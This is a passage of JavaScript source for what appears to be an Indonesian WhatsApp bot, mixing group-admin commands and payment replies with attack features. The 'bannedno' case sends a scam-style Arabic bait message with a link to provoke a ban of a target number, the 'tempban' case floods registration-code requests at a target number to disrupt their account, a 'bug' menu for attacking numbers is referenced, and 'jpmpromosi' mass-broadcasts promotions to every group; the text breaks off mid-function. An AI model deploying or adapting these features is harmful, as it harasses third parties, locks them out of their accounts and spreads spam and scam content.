│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`OWNER MENU\` 」* ─═⬣
│┏⊱
║⿻ Setowner
│⿻ Addowner
║⿻ Addprem
│⿻ Delprem
║⿻ Delowner
│⿻ Public
║⿻ Self
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: ownermenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
zyn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Pea?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
HadzzModa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break

case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await zyn.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283193344628\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@zynxzoo\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await zyn.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
zyn.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://b.top4top.io/p_3194nb6rt0.jpeg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "danamasuk": {
if (!isOwner) return reply(mess.only.owner)
let teks = `*DONE DANA MASUK*

Reqname :

▰▰▰▰▰▰▰▰
*Garansi 7 Day*
*Create ${wib}*
*Hari Ini ${hariini}*`
zyn.sendMessage(from, { text : teks }, { quoted : m })
}
break

case 'proses':{
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*')
zyn.sendMessage("6283193344628@s.whatsapp.net", { text: "BANG Jack ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break

case 'howtousedbug': {
return reply(`Gunakan Command Bug Yang Ada, Lalu Input Nomor Target Setelahnya`)
}
break

case 'lacaklokasi': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!q) return reply(' Enter name')
await zyn.sendMessage(m.chat, {text: `di bumi, di atas tanah, di Indonesia`},{quoted: m})
sleep(2000)
return reply(`🗿`)
}
break

case 'bannedno': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!q) return reply('Enter the Target number Prefix "+" and Country Code')
await zyn.sendMessage(m.chat, {text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
return reply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
}
break

case 'infono': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!q) return reply(' Enter the Target number Prefix "+" and Country Code')
await zyn.sendMessage(m.chat, {text: `informasi kontak
Name : ${m.pushName}
Number : ${q}
Status : *${zyn ? '✅' : `❌`}*`},{quoted: m})
}
break

case 'ttqqtoo': {
return reply(`Many Thanks To *JALL* Supporters In Developing This Bot Script! (⁠ ⁠╹⁠▽⁠╹⁠ ⁠) `)

(`CREATOR
> RafzTanvan`)
}
break

case 'infobot': {
infobot = {
image: zyn,
caption: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
BOT : AKTIF
OWNER : JallTamvan
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
}
zyn.sendMessage(m.chat, infobot)
}
break

case 'tempban': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!text) return zreply(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(text)) return zreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
